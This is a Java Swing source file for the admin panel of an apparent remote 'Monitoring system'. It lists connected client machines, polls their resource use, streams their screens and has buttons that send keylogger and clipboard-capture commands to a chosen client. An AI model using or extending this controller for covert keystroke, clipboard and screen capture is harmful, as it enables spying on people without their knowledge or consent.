package swing;

import admin.Admin;
import models.SystemInfoModel;
import swing.ContextMenu.test;
import swing.button.ButtonCustom;
import swing.notification.Notification;
import swing.progressbar.ProgressBarCustom;
import swing.table.TableCustom;
import swing.toggle.ToggleAdapter;
import swing.toggle.ToggleButton;
import utils.console;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.concurrent.ThreadPoolExecutor;

import static utils.Command.*;

public class index extends JFrame {
    private JPanel main;
    private JTextArea txtarea_log;
    private JTextField txt_uuid;
    private ProgressBarCustom pgb_cpu;
    private ProgressBarCustom pgb_ram;
    private ProgressBarCustom pgb_disk;
    private ButtonCustom btn_logout;
    private ButtonCustom btn_process;
    private ButtonCustom btn_clipboard;
    private ButtonCustom btn_keylog;
    private JTable table;
    private JLabel lbl_uuid;
    private JLabel lbl_cpu;
    private JLabel lbl_ram;
    private JLabel lbl_disk;
    private JLabel lbl_ip;
    private JTextField txt_cpu;
    private JTextField txt_ram;
    private JTextField txt_disk;
    private JTextField txt_ip;
    private JLabel lbl_usage_cpu;
    private JLabel lbl_usage_ram;
    private JLabel lbl_usage_disk;
    private JLabel lbl_client_monitor;
    private JPanel left;
    private JPanel right;
    private JScrollPane jsp_table;
    private JPanel right_left;
    private JPanel right_right;
    private JPanel right_left_middle;
    private JPanel right_left_bottom;
    private JPanel right_right_top;
    private JPanel right_right_bottom;
    private JPanel right_right_middle;
    private JScrollPane jsp_txtarea_log;
    private ToggleButton toggle_screen;
    private ToggleButton toggle_monitor;
    private JPanel monitor;
    private JPanel usage;
    private JPanel right_left_top;
    private ToggleButton toggle_usage;

    private static Admin admin;
    private String currentClientId;
    private static DefaultTableModel defaultTableModel = new DefaultTableModel();
    private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
    private static Notification panel;
    private static Thread a;
    private static Thread b;
    private static Thread c;
    public index() {
        initComponent();
        (admin = new Admin(this)).start();
        (a = new Thread(this::fetch)).start();
        (b = new Thread(this::screen)).start();
        (c = new Thread(this::monitoring)).start();
    }

    private void initComponent() {
        /**
         * Frame config
         */
        this.setSize(1200, 800);
        this.setResizable(true);
        this.setContentPane(main);
        this.setLocationRelativeTo(null);
        this.setTitle("Monitoring system");
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        /**
         * Panel config
         */
        this.main.setBackground(Color.WHITE);
        this.left.setBackground(Color.WHITE);
        this.right.setBackground(Color.WHITE);
        this.right_left.setBackground(Color.WHITE);
        this.right_right.setBackground(Color.WHITE);
        this.right_left_middle.setBackground(Color.WHITE);
        this.right_left_top.setBackground(Color.WHITE);
        this.monitor.setBackground(Color.WHITE);
        this.usage.setBackground(Color.WHITE);
        this.right_right_top.setBackground(Color.WHITE);
        this.right_left_bottom.setBackground(Color.WHITE);
        this.right_right_middle.setBackground(Color.WHITE);
        this.right_right_bottom.setBackground(Color.WHITE);
        /**
         * Table config
         */
        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        defaultTableModel.setColumnIdentifiers(tableHeaders);
        this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
            public void valueChanged(ListSelectionEvent e) {
                int selectedRow = table.getSelectedRow();
                if (selectedRow == -1) {
                    return;
                }
                currentClientId = (String) table.getValueAt(selectedRow, 0);
                SystemInfoModel client = admin.getClients().get(currentClientId);
                txt_uuid.setText(currentClientId);
                txt_ram.setText(client.getRam());
                txt_disk.setText(client.getDisk());
                txt_cpu.setText(client.getCpu());
                txt_ip.setText(client.getIp());

                console.info("[CURRENT CLIENT] " + currentClientId);
            }
        });
        /**
         * ActionListener config
         */
        this.btn_clipboard.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_CLIPBOARD);
            }
        });
        this.btn_keylog.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_KEYLOGGER);
            }
        });

        test.addDefaultContextMenu(txtarea_log);
        panel = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER, "Client has disconnect!");

        txt_uuid.setBorder(new EmptyBorder(0,0,0,0));
        txt_cpu.setBorder(new EmptyBorder(0,0,0,0));
        txt_ram.setBorder(new EmptyBorder(0,0,0,0));
        txt_disk.setBorder(new EmptyBorder(0,0,0,0));
        txt_ip.setBorder(new EmptyBorder(0,0,0,0));

        btn_keylog = new ButtonCustom();
        btn_keylog.setStyle(ButtonCustom.ButtonStyle.PRIMARY);
        btn_keylog.setText("Keylog");

        this.toggle_usage.setSelected(true);
        this.toggle_usage.addEventToggleSelected(new ToggleAdapter() {
            @Override
            public void onSelected(boolean selected) {
                console.error("toggle_monitor");
                if (selected) {
                    c.resume();
                }
                c.suspend();
            }
        });

        this.toggle_monitor.setSelected(true);
        this.toggle_monitor.addEventToggleSelected(new ToggleAdapter() {
            @Override
            public void onSelected(boolean selected) {
                console.error("toggle_screen");
                if (selected) {
                    b.resume();
                }
                b.suspend();
            }
        });

        table.setModel(defaultTableModel);
        TableCustom.apply(jsp_table, TableCustom.TableType.MULTI_LINE);
    }

    public void sync() {
        panel.setMessageText(String.format("Client [%s] has disconnected!", currentClientId.substring(0, currentClientId.length()/2)));
        int rowCount = defaultTableModel.getRowCount();
        for (int i = rowCount - 1; i >= 0; i--) {
            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
        }
        currentClientId = null;
        panel.showNotification();
        txt_uuid.setText(null);
        txt_cpu.setText(null);
        txt_ram.setText(null);
        txt_disk.setText(null);
        txt_ip.setText(null);
        pgb_cpu.setValue(0);
        pgb_ram.setValue(0);
        pgb_disk.setValue(0);
        txtarea_log.setText(null);
    }

    public void fetch() {
        while (true) {
            console.warn("GUI FETCHING...");
            try {
                (defaultTableModel = new DefaultTableModel()).setColumnIdentifiers(tableHeaders);
                admin.getClients().forEach((key, value) -> {
                    defaultTableModel.addRow(new Object[]{
                            key,
                            value.getHostName(),
                            value.getOs(),
                            value.getMAC_address(),
                            value.getIp()});
                });
                table.setModel(defaultTableModel);
                Thread.currentThread().sleep(5000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void screen() {
        while (true) {
            console.warn("SCREEN FETCHING...");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_CLIENT_SCREEN);
                }
                Thread.currentThread().sleep(1000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void updateClientScreen(ImageIcon imageIcon) {
        lbl_client_monitor.setText(null);
        lbl_client_monitor.setBorder(null);
        lbl_client_monitor.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(400, 300, Image.SCALE_SMOOTH)));
    }

    public void monitoring() {
        while (true) {
            console.warn("MONITORING FETCHING...");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_MONITORING);
                }
                Thread.currentThread().sleep(2000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void updateProgressBar(int cpu, int ram, int disk) {
        this.pgb_cpu.setValue(cpu);
        this.pgb_ram.setValue(ram);
        this.pgb_disk.setValue(disk);
    }

    public void appendLog(String message) {
        txtarea_log.append(message + "\n");
    }

    public String getCurrentClientId() {
        return currentClientId;
    }
}
